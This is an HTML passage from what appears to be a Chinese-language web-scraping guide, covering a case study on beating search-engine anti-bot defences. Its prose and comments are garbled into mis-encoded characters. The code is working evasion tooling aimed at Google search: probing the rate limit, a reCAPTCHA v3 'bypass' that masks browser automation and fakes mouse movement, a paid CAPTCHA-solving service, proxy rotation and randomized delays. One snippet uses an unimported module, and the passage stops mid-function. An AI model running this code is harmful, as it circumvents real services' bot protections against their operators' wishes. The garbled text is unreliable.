      <p>è¯·ä»…åœ¨æˆæƒç¯å¢ƒä¸‹è¿›è¡Œæµ‹è¯•ï¼Œå°Šé‡å†…å®¹åˆ›ä½œè€…çš„æƒç›Šå’Œç‰ˆæƒã€‚</p>

      <hr />

      <h2 id="å·¥å…·æ¨è">å·¥å…·æ¨è</h2>

      <h3 id="rssatom-å·¥å…·">RSS/Atom å·¥å…·</h3>

      <ul>
        <li><strong>feedparser</strong>: Python RSS/Atom è§£æåº“</li>
        <li><strong>Feedly</strong>: å•†ä¸š RSS èšåˆæœåŠ¡</li>
        <li><strong>Inoreader</strong>: RSS é˜…è¯»å™¨</li>
      </ul>

      <h3 id="å†…å®¹æå–">å†…å®¹æå–</h3>

      <ul>
        <li><strong>newspaper3k</strong>: æ–°é—»æ–‡ç« æå–</li>
        <li><strong>Readability</strong>: å†…å®¹æå–ç®—æ³•</li>
        <li><strong>Trafilatura</strong>: ç½‘é¡µå†…å®¹æå–</li>
        <li><strong>BeautifulSoup</strong>: HTML è§£æ</li>
      </ul>

      <h3 id="å»é‡ç®—æ³•">å»é‡ç®—æ³•</h3>

      <ul>
        <li><strong>simhash</strong>: æ–‡æœ¬æŒ‡çº¹</li>
        <li><strong>datasketch</strong>: MinHash å®ç°</li>
        <li><strong>faiss</strong>: å‘é‡ç›¸ä¼¼åº¦æœç´¢</li>
      </ul>

      <h3 id="å®æ—¶æ¨é€">å®æ—¶æ¨é€</h3>

      <ul>
        <li><strong>websocket-client</strong>: Python WebSocket å®¢æˆ·ç«¯</li>
        <li><strong>Socket.IO</strong>: å®æ—¶é€šä¿¡æ¡†æ¶</li>
        <li><strong>SSE</strong>: Server-Sent Events</li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#01-Foundations-http-https-protocol">HTTP/HTTPS åè®®</a></li>
        <li><a href="../02-Techniques/js_hook.md">JavaScript Hook æŠ€æœ¯</a></li>
        <li><a href="#03-Basic-Recipes-websocket-reversing">WebSocket é€†å‘</a></li>
        <li><a href="#04-Advanced-Recipes-csp-bypass">å†…å®¹å®‰å…¨ç­–ç•¥ç»•è¿‡</a></li>
        <li><a href="#05-Case-Studies-case-search-engine">æœç´¢å¼•æ“å¯¹æŠ—</a></li>
      </ul>

    </div>

    <div class="section" id="05-Case-Studies-case-search-engine">
      <h2>50. Search Engine</h2>
      <h1 id="æœç´¢å¼•æ“å¯¹æŠ—">æœç´¢å¼•æ“å¯¹æŠ—</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æœç´¢å¼•æ“æ‹¥æœ‰ä¸šç•Œæœ€å¼ºçš„åçˆ¬è™«é˜²æŠ¤æœºåˆ¶ã€‚æœ¬æ–‡é€šè¿‡ 5 ä¸ªçœŸå®æ¡ˆä¾‹ï¼Œè®²è§£æœç´¢å¼•æ“çš„é˜²æŠ¤æŠ€æœ¯åŠå…¶å¯¹æŠ—ç­–ç•¥ã€‚</p>

      <hr />

      <h2 id="æ¡ˆä¾‹-1-captcha-ä¸é¢‘ç‡é™åˆ¶ç»•è¿‡">æ¡ˆä¾‹ 1: CAPTCHA ä¸é¢‘ç‡é™åˆ¶ç»•è¿‡</h2>

      <h3 id="èƒŒæ™¯">èƒŒæ™¯</h3>

      <p>æœç´¢å¼•æ“ï¼ˆGoogleã€Bingã€ç™¾åº¦ï¼‰ä½¿ç”¨ CAPTCHAï¼ˆéªŒè¯ç ï¼‰å’Œ IP é¢‘ç‡é™åˆ¶æ¥é˜²æ­¢è‡ªåŠ¨åŒ–çˆ¬å–ã€‚</p>

      <h3 id="é˜²æŠ¤æœºåˆ¶">é˜²æŠ¤æœºåˆ¶</h3>

      <h4 id="1-captcha-ç±»å‹">1. CAPTCHA ç±»å‹</h4>

      <p><strong>Google reCAPTCHA v3</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="s2">&quot;https://www.google.com/recaptcha/api.js?render=site_key&quot;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="nx">grecaptcha</span><span class="p">.</span><span class="nx">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">grecaptcha</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="s1">&#39;site_key&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">action</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;search&#39;</span><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// å°† token å‘é€åˆ°æœåŠ¡å™¨éªŒè¯</span>
<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;recaptcha_token&#39;</span><span class="p">).</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">token</span><span class="p">;</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">});</span>
<span class="o">&lt;</span><span class="err">/script&gt;</span>
</code></pre>
      </div>

      <p><strong>hCaptcha</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;h-captcha&quot;</span> <span class="na">data-sitekey</span><span class="o">=</span><span class="s">&quot;your_site_key&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://js.hcaptcha.com/1/api.js&quot;</span> <span class="na">async</span> <span class="na">defer</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <h4 id="2-é¢‘ç‡æ£€æµ‹">2. é¢‘ç‡æ£€æµ‹</h4>

      <p>åŸºäºä»¥ä¸‹æŒ‡æ ‡:</p>

      <ul>
        <li><strong>IP åœ°å€</strong>: å• IP æ¯åˆ†é’Ÿè¯·æ±‚æ¬¡æ•°</li>
        <li><strong>User-Agent</strong>: è¯†åˆ«çˆ¬è™«ç‰¹å¾</li>
        <li><strong>Cookie</strong>: è¿½è¸ªç”¨æˆ·ä¼šè¯</li>
        <li><strong>è¡Œä¸ºæ¨¡å¼</strong>: è¯·æ±‚é—´éš”ã€æœç´¢æ¨¡å¼</li>
      </ul>

      <h3 id="é€†å‘æ­¥éª¤">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-åˆ†æ-captcha-è§¦å‘æ¡ä»¶">1. åˆ†æ CAPTCHA è§¦å‘æ¡ä»¶</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">def</span><span class="w"> </span><span class="nf">test_rate_limit</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;æµ‹è¯•æœç´¢å¼•æ“çš„é¢‘ç‡é™åˆ¶é˜ˆå€¼&quot;&quot;&quot;</span>
    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span>
    <span class="p">}</span>

    <span class="n">captcha_triggered</span> <span class="o">=</span> <span class="kc">False</span>
    <span class="n">request_count</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">while</span> <span class="ow">not</span> <span class="n">captcha_triggered</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
            <span class="s1">&#39;https://www.google.com/search&#39;</span><span class="p">,</span>
            <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;test query </span><span class="si">{</span><span class="n">request_count</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">},</span>
            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
        <span class="p">)</span>

        <span class="n">request_count</span> <span class="o">+=</span> <span class="mi">1</span>

        <span class="c1"># æ£€æµ‹æ˜¯å¦è§¦å‘ CAPTCHA</span>
        <span class="k">if</span> <span class="s1">&#39;captcha&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">or</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">429</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;CAPTCHA triggered after </span><span class="si">{</span><span class="n">request_count</span><span class="si">}</span><span class="s2"> requests&quot;</span><span class="p">)</span>
            <span class="n">captcha_triggered</span> <span class="o">=</span> <span class="kc">True</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Request </span><span class="si">{</span><span class="n">request_count</span><span class="si">}</span><span class="s2">: OK&quot;</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># æ¯ç§’ 1 æ¬¡è¯·æ±‚</span>

<span class="n">test_rate_limit</span><span class="p">()</span>
</code></pre>
      </div>

      <p><strong>ç»“æœ</strong>:</p>

      <ul>
        <li>Google: çº¦ 20-30 æ¬¡/åˆ†é’Ÿï¼ˆIPï¼‰</li>
        <li>Bing: çº¦ 50-60 æ¬¡/åˆ†é’Ÿ</li>
        <li>ç™¾åº¦: çº¦ 100 æ¬¡/åˆ†é’Ÿ</li>
      </ul>

      <h4 id="2-recaptcha-v3-ç»•è¿‡">2. reCAPTCHA v3 ç»•è¿‡</h4>

      <p>reCAPTCHA v3 ä¸æ˜¾ç¤ºéªŒè¯ç ï¼Œè€Œæ˜¯è¯„åˆ†ï¼ˆ0.0-1.0ï¼‰:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">playwright.sync_api</span><span class="w"> </span><span class="kn">import</span> <span class="n">sync_playwright</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RecaptchaV3Bypass</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">playwright</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">browser</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">solve_recaptcha</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">site_key</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;search&#39;</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        é€šè¿‡æ¨¡æ‹ŸçœŸå®ç”¨æˆ·è¡Œä¸ºæ¥æé«˜ reCAPTCHA è¯„åˆ†</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="k">with</span> <span class="n">sync_playwright</span><span class="p">()</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
            <span class="c1"># ä½¿ç”¨çœŸå®æµè§ˆå™¨é…ç½®</span>
            <span class="n">browser</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">chromium</span><span class="o">.</span><span class="n">launch</span><span class="p">(</span>
                <span class="n">headless</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>  <span class="c1"># éæ— å¤´æ¨¡å¼è¯„åˆ†æ›´é«˜</span>
                <span class="n">args</span><span class="o">=</span><span class="p">[</span>
                    <span class="s1">&#39;--disable-blink-features=AutomationControlled&#39;</span><span class="p">,</span>
                    <span class="s1">&#39;--disable-dev-shm-usage&#39;</span>
                <span class="p">]</span>
            <span class="p">)</span>

            <span class="n">context</span> <span class="o">=</span> <span class="n">browser</span><span class="o">.</span><span class="n">new_context</span><span class="p">(</span>
                <span class="n">viewport</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;width&#39;</span><span class="p">:</span> <span class="mi">1920</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span><span class="p">:</span> <span class="mi">1080</span><span class="p">},</span>
                <span class="n">user_agent</span><span class="o">=</span><span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span>
            <span class="p">)</span>

            <span class="c1"># åŠ è½½çœŸå® Cookieï¼ˆä»æµè§ˆå™¨å¯¼å‡ºï¼‰</span>
            <span class="n">context</span><span class="o">.</span><span class="n">add_cookies</span><span class="p">([</span>
                <span class="p">{</span>
                    <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;NID&#39;</span><span class="p">,</span>
                    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="s1">&#39;your_google_cookie&#39;</span><span class="p">,</span>
                    <span class="s1">&#39;domain&#39;</span><span class="p">:</span> <span class="s1">&#39;.google.com&#39;</span><span class="p">,</span>
                    <span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="s1">&#39;/&#39;</span>
                <span class="p">}</span>
            <span class="p">])</span>

            <span class="n">page</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">new_page</span><span class="p">()</span>

            <span class="c1"># æ¨¡æ‹ŸçœŸå®ç”¨æˆ·è¡Œä¸º</span>
            <span class="n">page</span><span class="o">.</span><span class="n">goto</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

            <span class="c1"># éšæœºé¼ æ ‡ç§»åŠ¨</span>
            <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
                <span class="n">x</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">800</span><span class="p">)</span>
                <span class="n">y</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">600</span><span class="p">)</span>
                <span class="n">page</span><span class="o">.</span><span class="n">mouse</span><span class="o">.</span><span class="n">move</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.1</span><span class="p">,</span> <span class="mf">0.3</span><span class="p">))</span>

            <span class="c1"># è§¦å‘ reCAPTCHA</span>
            <span class="n">token</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">evaluate</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">                new Promise((resolve) =&gt; </span><span class="se">{{</span>
<span class="s2">                    grecaptcha.ready(() =&gt; </span><span class="se">{{</span>
<span class="s2">                        grecaptcha.execute(&#39;</span><span class="si">{</span><span class="n">site_key</span><span class="si">}</span><span class="s2">&#39;, </span><span class="se">{{</span><span class="s2">action: &#39;</span><span class="si">{</span><span class="n">action</span><span class="si">}</span><span class="s2">&#39;</span><span class="se">}}</span><span class="s2">)</span>
<span class="s2">                            .then(token =&gt; resolve(token));</span>
<span class="s2">                    </span><span class="se">}}</span><span class="s2">);</span>
<span class="s2">                </span><span class="se">}}</span><span class="s2">)</span>
<span class="s2">            &quot;&quot;&quot;</span><span class="p">)</span>

            <span class="n">browser</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">token</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">search_with_recaptcha</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¸¦ reCAPTCHA çš„æœç´¢&quot;&quot;&quot;</span>
        <span class="n">token</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">solve_recaptcha</span><span class="p">(</span>
            <span class="s1">&#39;https://www.google.com&#39;</span><span class="p">,</span>
            <span class="n">site_key</span><span class="o">=</span><span class="s1">&#39;6LfxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxE&#39;</span>
        <span class="p">)</span>

        <span class="c1"># ä½¿ç”¨ token è¿›è¡Œæœç´¢</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
            <span class="s1">&#39;https://www.google.com/search&#39;</span><span class="p">,</span>
            <span class="n">params</span><span class="o">=</span><span class="p">{</span>
                <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="n">query</span><span class="p">,</span>
                <span class="s1">&#39;recaptcha_token&#39;</span><span class="p">:</span> <span class="n">token</span>
            <span class="p">}</span>
        <span class="p">)</span>

        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span>
</code></pre>
      </div>

      <h4 id="3-ä½¿ç”¨ç¬¬ä¸‰æ–¹-captcha-æ±‚è§£æœåŠ¡">3. ä½¿ç”¨ç¬¬ä¸‰æ–¹ CAPTCHA æ±‚è§£æœåŠ¡</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">twocaptcha</span><span class="w"> </span><span class="kn">import</span> <span class="n">TwoCaptcha</span>

<span class="k">class</span><span class="w"> </span><span class="nc">CaptchaSolver</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">api_key</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">solver</span> <span class="o">=</span> <span class="n">TwoCaptcha</span><span class="p">(</span><span class="n">api_key</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">solve_recaptcha_v2</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">site_key</span><span class="p">,</span> <span class="n">page_url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ±‚è§£ reCAPTCHA v2&quot;&quot;&quot;</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">recaptcha</span><span class="p">(</span>
                <span class="n">sitekey</span><span class="o">=</span><span class="n">site_key</span><span class="p">,</span>
                <span class="n">url</span><span class="o">=</span><span class="n">page_url</span>
            <span class="p">)</span>

            <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">solve_hcaptcha</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">site_key</span><span class="p">,</span> <span class="n">page_url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ±‚è§£ hCaptcha&quot;&quot;&quot;</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">hcaptcha</span><span class="p">(</span>
                <span class="n">sitekey</span><span class="o">=</span><span class="n">site_key</span><span class="p">,</span>
                <span class="n">url</span><span class="o">=</span><span class="n">page_url</span>
            <span class="p">)</span>

            <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">return</span> <span class="kc">None</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">solver</span> <span class="o">=</span> <span class="n">CaptchaSolver</span><span class="p">(</span><span class="n">api_key</span><span class="o">=</span><span class="s1">&#39;your_2captcha_api_key&#39;</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">solver</span><span class="o">.</span><span class="n">solve_recaptcha_v2</span><span class="p">(</span>
    <span class="n">site_key</span><span class="o">=</span><span class="s1">&#39;6LfxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxE&#39;</span><span class="p">,</span>
    <span class="n">page_url</span><span class="o">=</span><span class="s1">&#39;https://www.google.com/search?q=test&#39;</span>
<span class="p">)</span>

<span class="c1"># æäº¤å¸¦ token çš„è¯·æ±‚</span>
<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
    <span class="s1">&#39;https://www.google.com/search&#39;</span><span class="p">,</span>
    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="s1">&#39;test&#39;</span><span class="p">,</span>
        <span class="s1">&#39;g-recaptcha-response&#39;</span><span class="p">:</span> <span class="n">token</span>
    <span class="p">}</span>
<span class="p">)</span>
</code></pre>
      </div>

      <h3 id="é¢‘ç‡é™åˆ¶ç»•è¿‡">é¢‘ç‡é™åˆ¶ç»•è¿‡</h3>

      <h4 id="1-ip-è½®æ¢">1. IP è½®æ¢</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">itertools</span><span class="w"> </span><span class="kn">import</span> <span class="n">cycle</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ProxyRotator</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">proxy_list</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        proxy_list: [&#39;http://1.2.3.4:8080&#39;, &#39;http://5.6.7.8:8080&#39;, ...]</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">proxy_pool</span> <span class="o">=</span> <span class="n">cycle</span><span class="p">(</span><span class="n">proxy_list</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_with_rotation</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨ä»£ç†è½®æ¢å‘é€è¯·æ±‚&quot;&quot;&quot;</span>
        <span class="n">max_retries</span> <span class="o">=</span> <span class="mi">5</span>

        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">max_retries</span><span class="p">):</span>
            <span class="n">proxy</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">proxy_pool</span><span class="p">)</span>

            <span class="k">try</span><span class="p">:</span>
                <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
                    <span class="n">url</span><span class="p">,</span>
                    <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span>
                    <span class="n">proxies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">:</span> <span class="n">proxy</span><span class="p">},</span>
                    <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
                <span class="p">)</span>

                <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
                    <span class="k">return</span> <span class="n">response</span>

            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Proxy </span><span class="si">{</span><span class="n">proxy</span><span class="si">}</span><span class="s2"> failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="k">continue</span>

        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s2">&quot;All proxies failed&quot;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨ä»£ç†æ± è¿›è¡Œæœç´¢</span>
<span class="n">proxy_list</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s1">&#39;http://proxy1.example.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;http://proxy2.example.com:8080&#39;</span><span class="p">,</span>
    <span class="s1">&#39;http://proxy3.example.com:8080&#39;</span><span class="p">,</span>
<span class="p">]</span>

<span class="n">rotator</span> <span class="o">=</span> <span class="n">ProxyRotator</span><span class="p">(</span><span class="n">proxy_list</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">rotator</span><span class="o">.</span><span class="n">get_with_rotation</span><span class="p">(</span>
        <span class="s1">&#39;https://www.google.com/search&#39;</span><span class="p">,</span>
        <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;q&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;query </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">}</span>
    <span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Search </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-è¯·æ±‚é—´éš”éšæœºåŒ–">2. è¯·æ±‚é—´éš”éšæœºåŒ–</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">random</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">RateLimitEvader</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">min_delay</span><span class="o">=</span><span class="mf">2.0</span><span class="p">,</span> <span class="n">max_delay</span><span class="o">=</span><span class="mf">5.0</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">min_delay</span> <span class="o">=</span> <span class="n">min_delay</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">max_delay</span> <span class="o">=</span> <span class="n">max_delay</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">last_request_time</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">wait</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ™ºèƒ½ç­‰å¾…ï¼Œé¿å…è¢«æ£€æµ‹&quot;&quot;&quot;</span>
        <span class="n">current_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
        <span class="n">elapsed</span> <span class="o">=</span> <span class="n">current_time</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">last_request_time</span>

        <span class="c1"># ä½¿ç”¨æ­£æ€åˆ†å¸ƒç”Ÿæˆå»¶è¿Ÿï¼ˆæ›´æ¥è¿‘äººç±»è¡Œä¸ºï¼‰</span>
        <span class="n">delay</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">gauss</span><span class="p">(</span>
            <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">min_delay</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">max_delay</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">,</span>
            <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">max_delay</span> <span class="o">-</span> <span class="bp">self</span><span class="o">.</span><span class="n">min_delay</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span>
        <span class="p">)</span>
